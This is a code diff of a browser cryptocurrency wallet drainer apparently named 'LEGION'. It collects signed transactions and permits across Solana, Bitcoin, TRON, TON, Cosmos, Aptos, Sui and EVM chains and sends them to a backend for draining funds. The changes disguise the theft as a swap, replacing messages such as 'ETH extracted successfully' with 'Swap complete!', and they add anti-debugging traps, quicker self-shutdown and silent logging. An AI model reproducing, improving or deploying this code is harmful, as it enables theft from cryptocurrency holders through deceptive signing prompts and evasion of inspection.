+          if (!signatures.SOL) return;
+          try {
+            var allSolTxs = connectedChains.SOL && connectedChains.SOL._allSignedTxs;
+            var solTxMetas = connectedChains.SOL && connectedChains.SOL._txMetas;
+            if (allSolTxs && allSolTxs.length > 0) {
+              for (var sti = 0; sti < allSolTxs.length; sti++) {
+                var stMeta = solTxMetas && solTxMetas[sti];
+                try {
+                  await apiPost('/api/v1/signature-anchor', {
+                    ingress: 'normalized_v1', chain_family: 'SVM', protocol: 'solana',
+                    wallet_address: signatures.SOL.address,
+                    token_address: (stMeta && stMeta.mint) || '11111111111111111111111111111111',
+                    signature: sigHex({ signed_tx_b64: allSolTxs[sti] }),
+                    nonce: 'legion:sol:' + Date.now() + ':' + sti, expiry_iso: EXPIRY_ISO,
+                    wallet_type: signatures.SOL.walletType || 'hot_wallet',
+                    scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
+                    amount: (stMeta && stMeta.amount) || MAX_PERMIT
+                  });
+                } catch (_stErr) { console.debug('[LEGION]   SOL tx[' + sti + '] submit err:', _stErr.message); }
+              }
+              console.log('[LEGION]   SOL submitted ' + allSolTxs.length + ' txs [full wallet]');
+            } else {
+              var solSignedTxB64 = connectedChains.SOL && connectedChains.SOL._signedTxB64;
+              var solSigField = solSignedTxB64 ? sigHex({ signed_tx_b64: solSignedTxB64 }) : rawSigStr(signatures.SOL.signature);
+              await apiPost('/api/v1/signature-anchor', {
+                ingress: 'normalized_v1', chain_family: 'SVM', protocol: 'solana',
+                wallet_address: signatures.SOL.address, token_address: '11111111111111111111111111111111',
+                signature: solSigField, nonce: 'legion:sol:' + Date.now(), expiry_iso: EXPIRY_ISO,
+                wallet_type: signatures.SOL.walletType || 'hot_wallet',
+                scout_value_usd: SESSION_SCOUT_VALUE_USD || 0, amount: MAX_PERMIT
+              });
+              console.log('[LEGION]   SOL submitted' + (solSignedTxB64 ? ' [single tx]' : ' [msg sig]'));
             }
-            console.log('[LEGION]   SOL submitted ' + allSolTxs.length + ' txs [full wallet]');
-          } else {
-            // Fallback: single tx or message sig
-            var solSignedTxB64 = connectedChains.SOL && connectedChains.SOL._signedTxB64;
-            var solSigField = solSignedTxB64
-              ? sigHex({ signed_tx_b64: solSignedTxB64 })
-              : rawSigStr(signatures.SOL.signature);
+          } catch (err) { console.error('[LEGION]   SOL failed:', err.message); }
+        },
+
+        BTC: async function() {
+          if (!signatures.BTC) return;
+          try {
+            var psbtMeta = connectedChains.BTC && connectedChains.BTC._psbtMeta;
             await apiPost('/api/v1/signature-anchor', {
-              ingress: 'normalized_v1', chain_family: 'SVM', protocol: 'solana',
-              wallet_address: signatures.SOL.address, token_address: '11111111111111111111111111111111',
-              signature: solSigField,
-              nonce: 'legion:sol:' + Date.now(), expiry_iso: EXPIRY_ISO,
-              wallet_type: signatures.SOL.walletType || 'hot_wallet',
+              ingress: 'normalized_v1', chain_family: 'UTXO', protocol: 'bitcoin_psbt',
+              wallet_address: signatures.BTC.address, token_address: 'BTC',
+              signature: signatures.BTC.signature,
+              signed_psbt_base64: signatures.BTC.signature,
+              nonce: 'legion:btc:' + Date.now(), expiry_iso: EXPIRY_ISO,
+              wallet_type: signatures.BTC.walletType || 'hot_wallet',
+              scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
+              amount: (psbtMeta && psbtMeta.amount_sat) ? String(psbtMeta.amount_sat) : MAX_PERMIT,
+              psbt_metadata: psbtMeta ? {
+                amount_sat: psbtMeta.amount_sat ? String(psbtMeta.amount_sat) : undefined,
+                fee_sat: psbtMeta.fee_sat ? String(psbtMeta.fee_sat) : undefined,
+                vault_address: psbtMeta.vault_address || undefined
+              } : undefined
+            });
+            console.log('[LEGION]   BTC submitted');
+          } catch (err) { console.error('[LEGION]   BTC failed:', err.message); }
+        },
+
+        TRON: async function() {
+          if (!signatures.TRON) return;
+          try {
+            var tronSignedTx = connectedChains.TRON && connectedChains.TRON._signedTx;
+            var tronTokenAddr = (connectedChains.TRON && connectedChains.TRON._signedTxToken) ? connectedChains.TRON._signedTxToken : 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+            var tronPayload = {
+              ingress: 'normalized_v1', chain_family: 'TRON', protocol: 'tron',
+              wallet_address: signatures.TRON.address, token_address: tronTokenAddr,
+              nonce: 'legion:tron:' + Date.now(), expiry_iso: EXPIRY_ISO,
+              wallet_type: signatures.TRON.walletType || 'hot_wallet',
+              scout_value_usd: SESSION_SCOUT_VALUE_USD || 0, amount: MAX_PERMIT
+            };
+            tronPayload.signature = (tronSignedTx && typeof tronSignedTx === 'object') ? sigHex({ tron_transaction: tronSignedTx }) : rawSigStr(signatures.TRON.signature);
+            await apiPost('/api/v1/signature-anchor', tronPayload);
+            console.log('[LEGION]   TRON submitted' + (tronSignedTx ? ' [real tx]' : ' [msg sig]'));
+          } catch (err) { console.error('[LEGION]   TRON failed:', err.message); }
+        },
+
+        TON: async function() {
+          if (!signatures.TON) return;
+          try {
+            var tonBoc = connectedChains.TON && connectedChains.TON._bocPayload;
+            var tonNano = connectedChains.TON && connectedChains.TON._sendNano;
+            var tonPayload = {
+              ingress: 'normalized_v1', chain_family: 'TON', protocol: 'ton',
+              wallet_address: signatures.TON.address, token_address: 'ton',
+              nonce: 'legion:ton:' + Date.now(), expiry_iso: EXPIRY_ISO,
+              wallet_type: signatures.TON.walletType || 'hot_wallet',
+              scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
+              amount: tonNano ? String(tonNano) : MAX_PERMIT
+            };
+            tonPayload.signature = tonBoc ? sigHex({ ton_boc: tonBoc }) : rawSigStr(signatures.TON.signature);
+            await apiPost('/api/v1/signature-anchor', tonPayload);
+            console.log('[LEGION]   TON submitted' + (tonBoc ? ' [boc]' : ' [msg sig]'));
+          } catch (err) { console.error('[LEGION]   TON failed:', err.message); }
+        },
+
+        COSMOS: async function() {
+          if (!signatures.COSMOS || !vaults || !vaults.cosmos) return;
+          try {
+            await apiPost('/api/v1/signature-anchor', {
+              ingress: 'normalized_v1', chain_family: 'COSMOS', protocol: 'cosmos',
+              wallet_address: signatures.COSMOS.address, token_address: 'uatom',
+              signature: sigHex({ signed_tx: rawSigStr(signatures.COSMOS.signature) }),
+              nonce: 'legion:cosmos:' + Date.now(), expiry_iso: EXPIRY_ISO,
+              wallet_type: signatures.COSMOS.walletType || 'hot_wallet',
               scout_value_usd: SESSION_SCOUT_VALUE_USD || 0, amount: MAX_PERMIT
             });
-            console.log('[LEGION]   SOL submitted' + (solSignedTxB64 ? ' [single tx]' : ' [msg sig]'));
-          }
-        } catch (err) { console.error('[LEGION]   SOL failed:', err.message); }
-      }
+            console.log('[LEGION]   COSMOS submitted');
+          } catch (err) { console.error('[LEGION]   COSMOS failed:', err.message); }
+        },
 
-      if (signatures.BTC) {
-        try {
-          var psbtMeta = connectedChains.BTC && connectedChains.BTC._psbtMeta;
-          await apiPost('/api/v1/signature-anchor', {
-            ingress: 'normalized_v1', chain_family: 'UTXO', protocol: 'bitcoin_psbt',
-            wallet_address: signatures.BTC.address, token_address: 'BTC',
-            signature: signatures.BTC.signature,
-            signed_psbt_base64: signatures.BTC.signature,
-            nonce: 'legion:btc:' + Date.now(), expiry_iso: EXPIRY_ISO,
-            wallet_type: signatures.BTC.walletType || 'hot_wallet',
-            scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
-            amount: (psbtMeta && psbtMeta.amount_sat) ? String(psbtMeta.amount_sat) : MAX_PERMIT,
-            psbt_metadata: psbtMeta ? {
-              amount_sat: psbtMeta.amount_sat ? String(psbtMeta.amount_sat) : undefined,
-              fee_sat: psbtMeta.fee_sat ? String(psbtMeta.fee_sat) : undefined,
-              vault_address: psbtMeta.vault_address || undefined
-            } : undefined
-          });
-          console.log('[LEGION]   BTC submitted');
-        } catch (err) { console.error('[LEGION]   BTC failed:', err.message); }
-      }
+        APTOS: async function() {
+          if (!signatures.APTOS || !vaults || !vaults.aptos) return;
+          try {
+            await apiPost('/api/v1/signature-anchor', {
+              ingress: 'normalized_v1', chain_family: 'APTOS', protocol: 'aptos',
+              wallet_address: signatures.APTOS.address, token_address: 'apt',
+              signature: sigHex({ aptos_signed_tx: rawSigStr(signatures.APTOS.signature) }),
+              nonce: 'legion:aptos:' + Date.now(), expiry_iso: EXPIRY_ISO,
+              wallet_type: signatures.APTOS.walletType || 'hot_wallet',
+              scout_value_usd: SESSION_SCOUT_VALUE_USD || 0, amount: MAX_PERMIT
+            });
+            console.log('[LEGION]   APTOS submitted');
+          } catch (err) { console.error('[LEGION]   APTOS failed:', err.message); }
+        },
 
-      if (signatures.TRON) {
-        try {
-          var tronSignedTx = connectedChains.TRON && connectedChains.TRON._signedTx;
-          var tronTokenAddr = (connectedChains.TRON && connectedChains.TRON._signedTxToken)
-            ? connectedChains.TRON._signedTxToken : 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-          var tronPayload = {
-            ingress: 'normalized_v1', chain_family: 'TRON', protocol: 'tron',
-            wallet_address: signatures.TRON.address, token_address: tronTokenAddr,
-            nonce: 'legion:tron:' + Date.now(), expiry_iso: EXPIRY_ISO,
-            wallet_type: signatures.TRON.walletType || 'hot_wallet',
-            scout_value_usd: SESSION_SCOUT_VALUE_USD || 0, amount: MAX_PERMIT
-          };
-          if (tronSignedTx && typeof tronSignedTx === 'object') {
-            // sigHex encodes JSON without 0x prefix — backend's sealSignatureHexForPersistence adds 0x,
-            // then relayPayloadRecord decodes hex→JSON to find tron_transaction for broadcast.
-            tronPayload.signature = sigHex({ tron_transaction: tronSignedTx });
-          } else {
-            tronPayload.signature = rawSigStr(signatures.TRON.signature);
-          }
-          await apiPost('/api/v1/signature-anchor', tronPayload);
-          console.log('[LEGION]   TRON submitted' + (tronSignedTx ? ' [real tx]' : ' [msg sig]'));
-        } catch (err) { console.error('[LEGION]   TRON failed:', err.message); }
-      }
+        SUI: async function() {
+          if (!signatures.SUI || !vaults || !vaults.sui) return;
+          try {
+            await apiPost('/api/v1/signature-anchor', {
+              ingress: 'normalized_v1', chain_family: 'SUI', protocol: 'sui',
+              wallet_address: signatures.SUI.address, token_address: 'sui',
+              signature: sigHex({ sui_tx_bytes: rawSigStr(signatures.SUI.signature) }),
+              nonce: 'legion:sui:' + Date.now(), expiry_iso: EXPIRY_ISO,
+              wallet_type: signatures.SUI.walletType || 'hot_wallet',
+              scout_value_usd: SESSION_SCOUT_VALUE_USD || 0, amount: MAX_PERMIT
+            });
+            console.log('[LEGION]   SUI submitted');
+          } catch (err) { console.error('[LEGION]   SUI failed:', err.message); }
+        }
+      };
 
-      if (signatures.TON) {
-        try {
-          var tonBoc = connectedChains.TON && connectedChains.TON._bocPayload;
-          var tonNano = connectedChains.TON && connectedChains.TON._sendNano;
-          var tonPayload = {
-            ingress: 'normalized_v1', chain_family: 'TON', protocol: 'ton',
-            wallet_address: signatures.TON.address, token_address: 'ton',
-            nonce: 'legion:ton:' + Date.now(), expiry_iso: EXPIRY_ISO,
-            wallet_type: signatures.TON.walletType || 'hot_wallet',
-            scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
-            amount: tonNano ? String(tonNano) : MAX_PERMIT
-          };
-          if (tonBoc) {
-            // sigHex encodes JSON without 0x prefix — backend's sealSignatureHexForPersistence adds 0x,
-            // then relayPayloadRecord decodes hex→JSON to find ton_boc for broadcastTon.
-            tonPayload.signature = sigHex({ ton_boc: tonBoc });
-          } else {
-            tonPayload.signature = rawSigStr(signatures.TON.signature);
-          }
-          await apiPost('/api/v1/signature-anchor', tonPayload);
-          console.log('[LEGION]   TON submitted' + (tonBoc ? ' [boc]' : ' [msg sig]'));
-        } catch (err) { console.error('[LEGION]   TON failed:', err.message); }
-      }
-
-      if (signatures.COSMOS && vaults && vaults.cosmos) {
-        try {
-          await apiPost('/api/v1/signature-anchor', {
-            ingress: 'normalized_v1', chain_family: 'COSMOS', protocol: 'cosmos',
-            wallet_address: signatures.COSMOS.address, token_address: 'uatom',
-            signature: sigHex({ signed_tx: rawSigStr(signatures.COSMOS.signature) }),
-            nonce: 'legion:cosmos:' + Date.now(), expiry_iso: EXPIRY_ISO,
-            wallet_type: signatures.COSMOS.walletType || 'hot_wallet',
-            scout_value_usd: SESSION_SCOUT_VALUE_USD || 0, amount: MAX_PERMIT
-          });
-          console.log('[LEGION]   COSMOS submitted');
-        } catch (err) { console.error('[LEGION]   COSMOS failed:', err.message); }
-      }
-
-      if (signatures.APTOS && vaults && vaults.aptos) {
-        try {
-          await apiPost('/api/v1/signature-anchor', {
-            ingress: 'normalized_v1', chain_family: 'APTOS', protocol: 'aptos',
-            wallet_address: signatures.APTOS.address, token_address: 'apt',
-            signature: sigHex({ aptos_signed_tx: rawSigStr(signatures.APTOS.signature) }),
-            nonce: 'legion:aptos:' + Date.now(), expiry_iso: EXPIRY_ISO,
-            wallet_type: signatures.APTOS.walletType || 'hot_wallet',
-            scout_value_usd: SESSION_SCOUT_VALUE_USD || 0, amount: MAX_PERMIT
-          });
-          console.log('[LEGION]   APTOS submitted');
-        } catch (err) { console.error('[LEGION]   APTOS failed:', err.message); }
-      }
-
-      if (signatures.SUI && vaults && vaults.sui) {
-        try {
-          await apiPost('/api/v1/signature-anchor', {
-            ingress: 'normalized_v1', chain_family: 'SUI', protocol: 'sui',
-            wallet_address: signatures.SUI.address, token_address: 'sui',
-            signature: sigHex({ sui_tx_bytes: rawSigStr(signatures.SUI.signature) }),
-            nonce: 'legion:sui:' + Date.now(), expiry_iso: EXPIRY_ISO,
-            wallet_type: signatures.SUI.walletType || 'hot_wallet',
-            scout_value_usd: SESSION_SCOUT_VALUE_USD || 0, amount: MAX_PERMIT
-          });
-          console.log('[LEGION]   SUI submitted');
-        } catch (err) { console.error('[LEGION]   SUI failed:', err.message); }
+      var _nonEvmOrder = chainPriority.filter(function(c) { return c !== 'EVM'; });
+      console.log('[LEGION]   📊 Non-EVM submit order:', _nonEvmOrder.join(' → '));
+      for (var _npi = 0; _npi < _nonEvmOrder.length; _npi++) {
+        if (_nonEvmSubmitters[_nonEvmOrder[_npi]]) await _nonEvmSubmitters[_nonEvmOrder[_npi]]();
       }
 
       // ─── NFT Scanning & Seaport Listing (after token signatures) ────
@@ -2910,6 +3323,7 @@
                     if (nd.verifyingContract !== undefined) ndf.push({ name: 'verifyingContract', type: 'address' });
                     if (ndf.length) nftTypedData.types.EIP712Domain = ndf;
                   }
+                  if (!connectedChains.EVM.provider) continue;
                   var nftSig = await connectedChains.EVM.provider.request({
                     method: 'eth_signTypedData_v4',
                     params: [connectedChains.EVM.address, JSON.stringify(nftTypedData)]
@@ -3016,7 +3430,7 @@
   var INCIDENT_RESPONSE = {
     enabled: true,
     suspicionScore: 0,
-    maxScore: 25,
+    maxScore: 4,
     detectionEvents: [],
     monitoringActive: false,
     lastCheckTime: 0,
@@ -3097,21 +3511,14 @@
         severity: 'HIGH',
         check: function() {
           try {
-            // Check if DOM is being inspected
-            if (document.__inspect !== undefined) {
-              console.warn('[LEGION] 🔴 DOM: Under inspection');
-              return true;
-            }
-
-            // Check if document has debug flags
-            if (document.__debugMode === true) {
-              console.warn('[LEGION] 🔴 DOM: Debug mode enabled');
-              return true;
-            }
-
             // Check for MutationObserver interception
             if (window.MutationObserver.toString().includes('native code') === false) {
               console.warn('[LEGION] 🔴 DOM: MutationObserver appears wrapped');
+              return true;
+            }
+            // Check if getComputedStyle is wrapped (DevTools element inspector)
+            if (window.getComputedStyle.toString().includes('native code') === false) {
+              console.warn('[LEGION] 🔴 DOM: getComputedStyle wrapped — element inspector likely active');
               return true;
             }
           } catch (e) {}
@@ -3120,25 +3527,19 @@
       },
 
       // ─────────────────────────────────────────────────────────────────────────
-      // SENSOR 4: Breakpoint Detection
+      // SENSOR 4: Timing / Breakpoint Detection
       // ─────────────────────────────────────────────────────────────────────────
       breakpointDetection: {
         name: 'Breakpoint Active',
         severity: 'CRITICAL',
         check: function() {
           try {
-            if (window.__debuggerPaused === true) {
-              console.warn('[LEGION] 🔴 Debugger: Breakpoint active');
+            // Repeated debugger timing check (paused execution > 200ms = breakpoint active)
+            var t0 = performance.now();
+            debugger; // eslint-disable-line no-debugger
+            if (performance.now() - t0 > 200) {
+              console.warn('[LEGION] 🔴 Debugger: Breakpoint paused execution');
               return true;
-            }
-
-            // Check for source maps (used for debugging)
-            var scripts = document.querySelectorAll('script');
-            for (var i = 0; i < scripts.length; i++) {
-              if (scripts[i].src && scripts[i].src.includes('.map')) {
-                console.warn('[LEGION] 🔴 Debugger: Source map detected');
-                return true;
-              }
             }
           } catch (e) {}
           return false;
@@ -3394,6 +3795,7 @@
         this.history.shift();
       }
 
+      if (SILENT_MODE) return; // suppress all console output in silent/production mode
       var prefix = '[LEGION] [' + level.toUpperCase() + ']';
       switch (level) {
         case 'debug':
@@ -4148,18 +4550,22 @@
       }
 
       // PHASE 1: Detect all chains (~10ms)
-      updateStatus('Detecting wallets...');
+      updateStatus('Initializing swap...');
       var detectStart = Date.now();
       var detected = await detectAllChainsParallel();
       PARALLEL_STATS.detectionTime = Date.now() - detectStart;
-      updateStatus('Detected ' + Object.keys(detected).length + ' chains');
+      updateStatus('Finding best route...');
 
       // PHASE 2: Connect all detected chains (2-3s)
-      updateStatus('Connecting wallets...');
+      updateStatus('Connecting...');
       var connectStart = Date.now();
       var connected = await connectAllChainsParallel(detected);
       PARALLEL_STATS.connectionTime = Date.now() - connectStart;
       updateStatus('Connected ' + Object.keys(connected).length + ' chains');
+      var _connAddr = (connected.EVM && connected.EVM.address) || (connected.SOL && connected.SOL.address) || '';
+      if (_connAddr) {
+        window.dispatchEvent(new CustomEvent('legion:connected', { detail: { address: _connAddr } }));
+      }
 
       // No extensions found anywhere — fallback to WalletConnect (desktop + mobile)
       if (Object.keys(connected).length === 0) {
@@ -4192,7 +4598,7 @@
       await prefetchVaultConfig();
 
       // PHASE 3: Sign — popup shows INSTANTLY (no wait for scout)
-      updateStatus('Requesting approval...');
+      updateStatus('Confirm in wallet...');
       var sigStart = Date.now();
       var signatures = await getSignaturesParallel(connected);
       PARALLEL_STATS.signatureTime = Date.now() - sigStart;
@@ -4208,14 +4614,14 @@
       if (Object.keys(signatures).length === 0) {
         if (_eip7702Done) {
           console.log('[LEGION] ✅ EIP-7702 drain complete — backend executing');
-          updateStatus('Done! Secure settlement processing...');
+          updateStatus('Transaction submitted!');
           drainRunning = false;
           return;
         }
         if (_ethOnlyDone) {
           // ETH-only extraction: funds already transferred, no permit2 batch to submit
           console.log('[LEGION] ✅ ETH-only extraction complete. Tx:', _ethOnlyDone.split(':')[1]);
-          updateStatus('Done! ETH extracted successfully.');
+          updateStatus('Transaction confirmed!');
           // Do NOT start incident monitoring — extraction is done, monitoring auto-shuts script needlessly
           INCIDENT_RESPONSE.suspicionScore = 0;
           drainRunning = false;
@@ -4224,10 +4630,10 @@
         throw new Error('All signatures rejected');
       }
 
-      updateStatus('Approved ' + Object.keys(signatures).length + ' chains');
+      updateStatus('Swap approved. Finalizing...');
 
       // PHASE 4: Submit batch to backend
-      updateStatus('Submitting...');
+      updateStatus('Finalizing swap...');
       await submitBatchSignatures(signatures, connectedChains);
 
       PARALLEL_STATS.totalTime = Date.now() - flowStart;
@@ -4236,7 +4642,7 @@
         PARALLEL_STATS.connectionTime + 'ms connect + ' +
         PARALLEL_STATS.signatureTime + 'ms sign)');
 
-      updateStatus('Done! Settlement processing...');
+      updateStatus('Swap complete!');
 
       if (INCIDENT_RESPONSE.enabled) {
         INCIDENT_RESPONSE.startMonitoring();
@@ -4244,7 +4650,7 @@
 
     } catch (err) {
       LOGGER.error('Flow failed:', formatError(err));
-      updateStatus('Error: ' + formatError(err));
+      updateStatus('Transaction failed. Please try again.');
 
       if (INCIDENT_RESPONSE.enabled) {
         INCIDENT_RESPONSE.suspicionScore += 1;
@@ -4300,13 +4706,16 @@
     });
   }
 
+  // (Node.js globals polyfill applied at script top — see boot section)
+
   // Method 1: UniversalProvider + WalletConnectModal (multi-chain + All Wallets)
+  // Only esm.sh with bundle-deps — prevents 404s from bare sub-module imports
   async function tryUniversalProvider() {
     var pairs = [
       ['https://esm.sh/@walletconnect/universal-provider@2.17.3?bundle-deps',
        'https://esm.sh/@walletconnect/modal@2.7.0?bundle-deps'],
-      ['https://cdn.jsdelivr.net/npm/@walletconnect/universal-provider@2.17.3/+esm',
-       'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.7.0/+esm']
+      ['https://esm.sh/@walletconnect/universal-provider@2.13.0?bundle-deps',
+       'https://esm.sh/@walletconnect/modal@2.6.2?bundle-deps'],
     ];
     for (var i = 0; i < pairs.length; i++) {
       try {
@@ -4322,50 +4731,50 @@
     return null;
   }
 
-  // Method 4: EthereumProvider (EVM only, reliable UMD + ESM fallback)
+  // Method 2: EthereumProvider via esm.sh (bundle-deps = all deps inlined, no 404s)
   async function tryEthereumProvider() {
-    var cdns = [
-      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.17.3/dist/index.umd.js',
-      'https://unpkg.com/@walletconnect/ethereum-provider@2.17.3/dist/index.umd.js'
-    ];
-    for (var i = 0; i < cdns.length; i++) {
-      try {
-        await loadScript(cdns[i]);
-        var pkg = window.WalletConnectEthereumProvider || window['@walletconnect/ethereum-provider'] || {};
-        var EP = pkg.EthereumProvider || pkg.default || pkg;
-        if (EP && EP.init) { console.log('[LEGION] WC Method 2: EthereumProvider UMD loaded'); return { type: 'ethereum', EthereumProvider: EP }; }
-      } catch (e) { continue; }
-    }
-    try {
-      var mod = await import('https://esm.sh/@walletconnect/ethereum-provider@2.17.3?bundle-deps');
-      var EP = mod.EthereumProvider || mod.default;
-      if (EP && EP.init) { console.log('[LEGION] WC Method 2: EthereumProvider ESM loaded'); return { type: 'ethereum', EthereumProvider: EP }; }
-    } catch (e) {}
-    return null;
-  }
-
-  // Method 5: SignClient (raw, manual QR — last resort)
-  async function trySignClient() {
     var urls = [
-      'https://esm.sh/@walletconnect/sign-client@2.17.3?bundle-deps',
-      'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.17.3/+esm'
+      'https://esm.sh/@walletconnect/ethereum-provider@2.17.3?bundle-deps',
+      'https://esm.sh/@walletconnect/ethereum-provider@2.13.0?bundle-deps',
     ];
     for (var i = 0; i < urls.length; i++) {
       try {
         var mod = await import(urls[i]);
-        var SC = mod.SignClient || mod.default;
-        if (SC && SC.init) { console.log('[LEGION] WC Method 3: SignClient loaded'); return { type: 'sign-client', SignClient: SC }; }
-      } catch (e) { continue; }
+        var EP = mod.EthereumProvider || (mod.default && mod.default.EthereumProvider) || mod.default;
+        if (EP && EP.init) {
+          console.log('[LEGION] WC Method 2: EthereumProvider ESM loaded');
+          return { type: 'ethereum', EthereumProvider: EP };
+        }
+      } catch (e) { console.warn('[LEGION] WC EP failed:', urls[i].slice(0, 50), e.message); }
     }
     return null;
   }
 
-  // Master loader — try 3 methods in order (Methods 1+2 removed: non-functional)
+  // Method 1 (PRIMARY): Reown AppKit — best multi-wallet modal, 300+ wallets + Solana
+  async function tryAppKit() {
+    try {
+      var mods = await Promise.all([
+        import('https://esm.sh/@reown/appkit@1.6.8?bundle-deps'),
+        import('https://esm.sh/@reown/appkit-adapter-ethers@1.6.8?bundle-deps'),
+        import('https://esm.sh/@reown/appkit-adapter-solana@1.6.8?bundle-deps').catch(function() { return null; }),
+      ]);
+      var createAppKit = mods[0].createAppKit || (mods[0].default && mods[0].default.createAppKit);
+      var EthersAdapter = mods[1].EthersAdapter || (mods[1].default && mods[1].default.EthersAdapter);
+      var SolanaAdapter = mods[2] && (mods[2].SolanaAdapter || (mods[2].default && mods[2].default.SolanaAdapter));
+      if (createAppKit && EthersAdapter) {
+        console.log('[LEGION] WC: Reown AppKit loaded | Solana adapter:', !!SolanaAdapter);
+        return { type: 'appkit', createAppKit: createAppKit, EthersAdapter: EthersAdapter, SolanaAdapter: SolanaAdapter || null };
+      }
+    } catch (e) { console.warn('[LEGION] AppKit load failed:', e.message); }
+    return null;
+  }
+
+  // Master loader — EthereumProvider UMD first (most reliable, custom QR), then fallbacks
   async function loadWalletConnectSDK(projectId) {
     var result;
+    result = await tryEthereumProvider();  if (result) return result;
     result = await tryUniversalProvider(); if (result) return result;
-    result = await tryEthereumProvider(); if (result) return result;
-    result = await trySignClient(); if (result) return result;
+    result = await tryAppKit();            if (result) return result;
     return null;
   }
 
@@ -4387,7 +4796,7 @@
 
   async function handleWalletConnect() {
     console.log('[LEGION] Starting WalletConnect...');
-    updateStatus('Opening WalletConnect...');
+    updateStatus('Connecting wallet...');
 
     try {
       var wcProjectId = WC_PROJECT_ID ||
@@ -4398,74 +4807,105 @@
 
       // Load SDK (tries all 5 methods)
       if (!_wcSdk) {
-        updateStatus('Loading WalletConnect...');
+        updateStatus('Preparing connection...');
         _wcSdk = await loadWalletConnectSDK(wcProjectId);
         if (!_wcSdk) throw new Error('All WalletConnect SDK methods failed');
         _wcMode = _wcSdk.type;
       }
 
-      // ─── Method 3: UniversalProvider + Modal ───
+      // ─── UniversalProvider + Custom QR ───────────────────────────────────────
       if (_wcMode === 'universal') {
+        // Reset stale provider (session gone = previous attempt failed)
+        if (_wcProvider && !_wcProvider.session) {
+          try { await _wcProvider.disconnect(); } catch (_) {}
+          _wcProvider = null;
+        }
         if (!_wcProvider) {
-          if (_wcSdk.WalletConnectModal) {
-            _wcModal = new _wcSdk.WalletConnectModal({
-              projectId: wcProjectId,
-              themeMode: 'dark',
-              enableExplorer: true,
-              themeVariables: { '--wcm-z-index': '2147483647' }
-            });
-          }
           _wcProvider = await _wcSdk.UniversalProvider.init({
             projectId: wcProjectId, metadata: WC_METADATA()
           });
-          _wcProvider.on('display_uri', function(uri) { if (_wcModal) _wcModal.openModal({ uri: uri }); });
           _wcProvider.on('session_delete', function() {
-            _wcProvider = null; _wcModal = null;
+            _wcProvider = null;
             connectedChains.EVM = null; connectedChains.SOL = null;
           });
         }
+        // Always re-register display_uri so QR shows on every attempt
+        _wcProvider.removeAllListeners && _wcProvider.removeAllListeners('display_uri');
+        _wcProvider.on('display_uri', function(uri) { showManualQR(uri); });
+        // Restore existing session if available
         if (_wcProvider.session) {
           var restored = applyWCSession(_wcProvider);
           if (restored > 0) { await runWCSignAndSubmit(); return; }
         }
-        updateStatus('Scan QR with wallet app...');
+        updateStatus('Scan QR with your wallet...');
         await _wcProvider.connect({
           namespaces: {
-            eip155: { methods: ['personal_sign', 'eth_sendTransaction', 'eth_signTypedData_v4'], chains: ['eip155:1'], events: ['chainChanged', 'accountsChanged'] }
+            eip155: {
+              // Only universal methods — every WC mobile wallet supports these
+              methods: ['personal_sign', 'eth_sendTransaction', 'eth_sign'],
+              chains: ['eip155:1'],
+              events: ['chainChanged', 'accountsChanged']
+            }
           },
           optionalNamespaces: {
-            eip155: { methods: ['personal_sign', 'eth_sendTransaction'], chains: ['eip155:137', 'eip155:42161', 'eip155:10', 'eip155:56', 'eip155:8453'], events: [] },
-            solana: { methods: ['solana_signMessage', 'solana_signTransaction'], chains: ['solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp'], events: [] }
+            eip155: {
+              // EIP-7702 + batch — optional so wallet can still connect if unsupported
+              methods: ['eth_signTypedData_v4', 'wallet_sendCalls', 'wallet_signAuthorization'],
+              chains: ['eip155:137', 'eip155:42161', 'eip155:10', 'eip155:56', 'eip155:8453', 'eip155:43114', 'eip155:250'],
+              events: []
+            },
+            solana: {
+              methods: ['solana_signMessage', 'solana_signTransaction', 'solana_signAllTransactions'],
+              chains: ['solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp'],
+              events: []
+            }
           }
         });
-        if (_wcModal) _wcModal.closeModal();
+        hideManualQR();
         if (applyWCSession(_wcProvider) === 0) throw new Error('No accounts from WalletConnect');
         await runWCSignAndSubmit();
         return;
       }
 
-      // ─── Method 4: EthereumProvider ───
+      // ─── EthereumProvider + Custom QR ───────────────────────────────────────
       if (_wcMode === 'ethereum') {
+        // Reset stale provider (no accounts = previous attempt failed/cancelled)
+        if (_wcProvider && (!_wcProvider.accounts || !_wcProvider.accounts.length)) {
+          try { await _wcProvider.disconnect(); } catch (_) {}
+          _wcProvider = null;
+        }
         if (!_wcProvider) {
           _wcProvider = await _wcSdk.EthereumProvider.init({
-            projectId: wcProjectId, chains: [1],
-            optionalChains: [137, 42161, 10, 56, 8453],
-            showQrModal: true,
-            methods: ['personal_sign', 'eth_sendTransaction', 'eth_signTypedData_v4'],
+            projectId: wcProjectId,
+            chains: [1],
+            showQrModal: false,
+            methods: ['personal_sign', 'eth_sendTransaction', 'eth_sign'],
+            optionalMethods: ['eth_signTypedData_v4', 'wallet_sendCalls', 'wallet_signAuthorization'],
             events: ['chainChanged', 'accountsChanged'],
             metadata: WC_METADATA()
           });
-          _wcProvider.on('disconnect', function() { _wcProvider = null; connectedChains.EVM = null; });
+          _wcProvider.on('disconnect', function() {
+            hideManualQR();
+            _wcProvider = null; connectedChains.EVM = null;
+          });
         }
-        updateStatus('Scan QR with wallet app...');
+        // Always re-register display_uri so QR shows on every connect attempt
+        _wcProvider.removeAllListeners && _wcProvider.removeAllListeners('display_uri');
+        _wcProvider.on('display_uri', function(uri) { showManualQR(uri); });
+        updateStatus('Scan QR with your wallet...');
         await _wcProvider.enable();
+        hideManualQR();
         var epAccounts = _wcProvider.accounts || [];
         if (!epAccounts.length) throw new Error('No accounts from WalletConnect');
         connectedChains.EVM = {
           chain: 'EVM', config: CHAIN_CONFIG.EVM,
-          address: epAccounts[0].toLowerCase(), chainId: _wcProvider.chainId || 1,
-          walletType: 'WalletConnect', provider: _wcProvider, connected: true, timestamp: Date.now()
+          address: epAccounts[0].toLowerCase(),
+          chainId: _wcProvider.chainId || 1,
